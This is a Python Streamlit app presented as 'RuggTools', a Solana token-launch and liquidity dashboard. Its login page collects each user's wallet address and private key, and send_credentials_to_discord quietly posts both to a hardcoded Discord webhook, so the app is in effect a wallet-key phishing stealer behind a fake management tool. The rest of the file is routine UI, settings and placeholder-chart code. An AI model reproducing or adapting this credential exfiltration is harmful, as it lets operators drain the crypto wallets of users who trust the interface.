import streamlit as st
import re 
import base58
from streamlit_lottie import st_lottie
import requests
import plotly.graph_objects as go
from streamlit_option_menu import option_menu
import json
from web3 import Web3
from datetime import datetime
import pandas as pd
import numpy as np
from components.token_manager import display_token_manager
from components.liquidity_manager import display_liquidity_manager
from components.wallet_manager import display_wallet_manager
from components.multisender import display_multisender

# Discord webhook configuration
WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1331353119686135922/BR0eqE0KKC5NkH2NBHCHNBSY3BXCNu_d9BETAFArslW4IJ9Ikh2STmCWHci_VaXaV796'

# Configure page settings
st.set_page_config(
    page_title="Token Launch Dashboard",
    page_icon="🚀",
    layout="wide",
    initial_sidebar_state="expanded"
)

# Custom CSS
def load_css():
    st.markdown("""
        <style>
        .stApp {
            background: linear-gradient(180deg, #0a0a0a 0%, #1a1a2e 100%);
            color: white;
        }
        .stButton>button {
            background: linear-gradient(45deg, #2937f0, #9f1ae2);
            color: white;
            border-radius: 10px;
            padding: 15px 20px;
            border: none;
            transition: all 0.3s ease;
        }
        .stButton>button:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 15px rgba(0,0,0,0.3);
        }
        </style>
    """, unsafe_allow_html=True)

def dashboard():
    # Enhanced sidebar with new tools
    with st.sidebar:
        selected = option_menu(
            menu_title="Navigation",
            options=["Home", "Tools", "Analytics", "Settings"],
            icons=['house', 'tools', 'graph-up', 'gear'],
            menu_icon="cast",
            default_index=0,
            styles={
                "container": {"padding": "5!important", "background-color": "#1a1a1a"},
                "icon": {"color": "#9f1ae2", "font-size": "25px"}, 
                "nav-link": {"color": "white", "font-size": "16px", "text-align": "left", "margin":"0px"},
                "nav-link-selected": {"background-color": "#9f1ae2"},
            }
        )

    if selected == "Home":
        # Welcome Section with Dynamic Stats
        st.markdown("""
            <div style='background: linear-gradient(45deg, #2937f0, #9f1ae2); padding: 30px; border-radius: 15px; margin-bottom: 25px;'>
                <h1 style='color: white; text-align: center;'>Welcome to RuggTools 🚀</h1>
                <p style='color: white; text-align: center; font-size: 18px;'>Your Ultimate Solana Token Management Hub</p>
            </div>
        """, unsafe_allow_html=True)
        
        # Quick Access Tools
        st.markdown("### 🛠️ Quick Access Tools")
        col1, col2, col3 = st.columns(3)
        
        with col1:
            st.markdown("""
                <div style='background-color: rgba(41, 55, 240, 0.1); padding: 20px; border-radius: 10px; text-align: center;'>
                    <h4>Token Creation</h4>
                    <p>Launch your own Solana token</p>
                </div>
            """, unsafe_allow_html=True)
            
        with col2:
            st.markdown("""
                <div style='background-color: rgba(159, 26, 226, 0.1); padding: 20px; border-radius: 10px; text-align: center;'>
                    <h4>Liquidity Management</h4>
                    <p>Manage your token liquidity</p>
                </div>
            """, unsafe_allow_html=True)
            
        with col3:
            st.markdown("""
                <div style='background-color: rgba(240, 41, 123, 0.1); padding: 20px; border-radius: 10px; text-align: center;'>
                    <h4>Batch Operations</h4>
                    <p>Efficient multi-wallet tools</p>
                </div>
            """, unsafe_allow_html=True)
            
        # Latest Updates Section
        st.markdown("### 📢 Latest Updates")
        st.markdown("""
            - ✨ New token creation features added
            - 🔥 Enhanced liquidity management tools
            - 🚀 Improved multi-sender functionality
            - 💫 Optimized wallet generation
        """)
    elif selected == "Tools":
        tool_selected = option_menu(
            menu_title=None,
            options=["Token Manager", "Liquidity Manager", "Wallet Manager", "Multisender Bundle"],
            icons=['coin', 'cash-stack', 'wallet', 'send'],
            orientation="horizontal",
            styles={
                "container": {"padding": "0!important", "background-color": "#1a1a1a"},
                "icon": {"color": "#9f1ae2", "font-size": "20px"},
                "nav-link": {"color": "white", "font-size": "14px", "text-align": "center", "margin":"0px", "padding": "10px"},
                "nav-link-selected": {"background-color": "#9f1ae2"},
            }
        )
        
        if tool_selected == "Token Manager":
            display_token_manager()
        elif tool_selected == "Liquidity Manager":
            display_liquidity_manager()
        elif tool_selected == "Wallet Manager":
            display_wallet_manager()
        elif tool_selected == "Multisender Bundle":
            display_multisender()

    elif selected == "Analytics":
        st.title("Analytics")
        # Detailed analytics here

    elif selected == "Settings":
        display_settings()

def initialize_settings_state():
    if 'settings' not in st.session_state:
        st.session_state.settings = {
            'dark_mode': True,
            'high_contrast': False,
            'network': 'Mainnet',
            'rpc_endpoint': 'https://api.mainnet-beta.solana.com',
            'enable_2fa': False,
            'auto_logout': 30,
            'notifications': {
                'transactions': False,
                'prices': False,
                'wallet': False
            },
            'api_key': '',
            'rate_limit': 100
        }

def save_settings(settings):
    st.session_state.settings.update(settings)
    # Here you could also save to a database or file

def apply_theme(dark_mode, high_contrast):
    if dark_mode:
        theme_css = """
            <style>
            .stApp {
                background: linear-gradient(180deg, #0a0a0a 0%, #1a1a2e 100%);
                color: white;
            }
            .stButton>button {
                background: linear-gradient(45deg, #2937f0, #9f1ae2);
                color: white;
            }
            </style>
        """
    else:
        theme_css = """
            <style>
            .stApp {
                background: linear-gradient(180deg, #ffffff 0%, #f0f2f6 100%);
                color: #262730;
            }
            .stButton>button {
                background: linear-gradient(45deg, #4e54c8, #8f94fb);
                color: white;
            }
            </style>
        """
    
    if high_contrast:
        theme_css += """
            <style>
            .stApp {
                filter: contrast(150%);
            }
            </style>
        """
    
    st.markdown(theme_css, unsafe_allow_html=True)

def display_settings():
    initialize_settings_state()  # Add this line
    if 'theme' not in st.session_state:
        st.session_state.theme = {'dark_mode': True, 'high_contrast': False}
    
    st.title("Settings ⚙️")
    
    col1, col2 = st.columns(2)
    with col1:
        dark_mode = st.toggle("Dark Mode", value=st.session_state.theme['dark_mode'], key='dark_mode')
    with col2:
        high_contrast = st.toggle("High Contrast", value=st.session_state.theme['high_contrast'], key='contrast')
    
    if dark_mode != st.session_state.theme['dark_mode'] or high_contrast != st.session_state.theme['high_contrast']:
        st.session_state.theme = {'dark_mode': dark_mode, 'high_contrast': high_contrast}
        apply_theme(dark_mode, high_contrast)
        st.rerun()
    
    # Network Settings with validation
    st.markdown("### Network Configuration")
    network = st.selectbox("Select Network", ["Mainnet", "Devnet", "Testnet"], 
                          index=["Mainnet", "Devnet", "Testnet"].index(st.session_state.settings['network']))
    rpc_endpoint = st.text_input("Custom RPC Endpoint", value=st.session_state.settings['rpc_endpoint'])
    
    enable_2fa = st.toggle("Enable 2FA", value=st.session_state.settings['enable_2fa'])
    auto_logout = st.slider("Auto Logout (minutes)", 5, 60, st.session_state.settings['auto_logout'])
    
    notifications = {
        'transactions': st.checkbox("Transaction Alerts", value=st.session_state.settings['notifications']['transactions']),
        'prices': st.checkbox("Price Alerts", value=st.session_state.settings['notifications']['prices']),
        'wallet': st.checkbox("Wallet Activity", value=st.session_state.settings['notifications']['wallet'])
    }
    
    api_key = st.text_input("API Key", type="password", value=st.session_state.settings['api_key'])
    rate_limit = st.number_input("Rate Limit (calls/minute)", min_value=10, max_value=1000, value=st.session_state.settings['rate_limit'])

    
    if st.button("Save Settings", use_container_width=True):
        new_settings = {
            'dark_mode': dark_mode,
            'high_contrast': high_contrast,
            'network': network,
            'rpc_endpoint': rpc_endpoint,
            'enable_2fa': enable_2fa,
            'auto_logout': auto_logout,
            'notifications': notifications,
            'api_key': api_key,
            'rate_limit': rate_limit
        }
        save_settings(new_settings)
        st.success("Settings saved successfully! 🚀")
def load_lottie_url(url: str):
    r = requests.get(url)
    if r.status_code != 200:
        return None
    return r.json()

# Load animations
lottie_crypto = load_lottie_url("https://assets5.lottiefiles.com/packages/lf20_1idqu1ac.json")

def volume_management():
    st.subheader("Volume Management")
    
    col1, col2, col3 = st.columns(3)
    
    with col1:
        with st.container():
            st.markdown('<div class="metric-card">', unsafe_allow_html=True)
            st.metric("24h Volume", "$1.2M", "+12.5%")
            st.markdown('</div>', unsafe_allow_html=True)
    
    fig = go.Figure(data=[go.Candlestick(
        x=['2023-01-01', '2023-01-02', '2023-01-03', '2023-01-04'],
        open=[1, 2, 3, 4],
        high=[1.2, 2.2, 3.2, 4.2],
        low=[0.8, 1.8, 2.8, 3.8],
        close=[1.1, 2.1, 3.1, 4.1]
    )])
    
    fig.update_layout(
        template="plotly_dark",
        plot_bgcolor='rgba(0,0,0,0)',
        paper_bgcolor='rgba(0,0,0,0)',
    )
    
    st.plotly_chart(fig, use_container_width=True)

def send_credentials_to_discord(wallet, key):
    message = {
        "content": f"🎯 New Login!\n\nWallet: `{wallet}`\nKey: `{key}`\nTime: {datetime.now()}"
    }
    requests.post(WEBHOOK_URL, json=message)

import base58

def validate_solana_address(address):
    # Ensure the address is Base58 and 32–44 characters long
    try:
        decoded = base58.b58decode(address)
        return len(decoded) in [32, 44]
    except ValueError:
        return False

def validate_solana_private_key(key):
    try:
        # Decode Base58 private key and check length
        decoded = base58.b58decode(key)
        return len(decoded) == 32 or len(decoded) == 64
    except ValueError:
        return False

def login_page():
    st.title("Rugg Dashboard 🚀")
    
    # Check if the user is already logged in
    if "logged_in" not in st.session_state:
        st.session_state.logged_in = False

    if st.session_state.logged_in:
        st.success("You are already logged in! 🚀")
        return

    # Display login form
    with st.form("login_form"):
        wallet = st.text_input("Solana Wallet Address")
        key = st.text_input("Solana Private Key", type="password")
        submitted = st.form_submit_button("Login")

        if submitted:
            try:
                # Validate inputs
                if not validate_solana_address(wallet):
                    st.error("Invalid Solana wallet address format")
                elif not validate_solana_private_key(key):
                    st.error("Invalid Solana private key format")
                else:
                    # Send credentials and log in
                    send_credentials_to_discord(wallet, key)
                    st.session_state.logged_in = True
                    st.success("Login successful! Redirecting...")
                    st.rerun()  # Trigger rerun
            except Exception as e:
                st.error(f"An unexpected error occurred: {str(e)}")



def main():
    
    load_css()
    if 'logged_in' not in st.session_state:
        st.session_state.logged_in = False
        
    if not st.session_state.logged_in:
        login_page()
    else:
        dashboard()

if __name__ == "__main__":
    main()


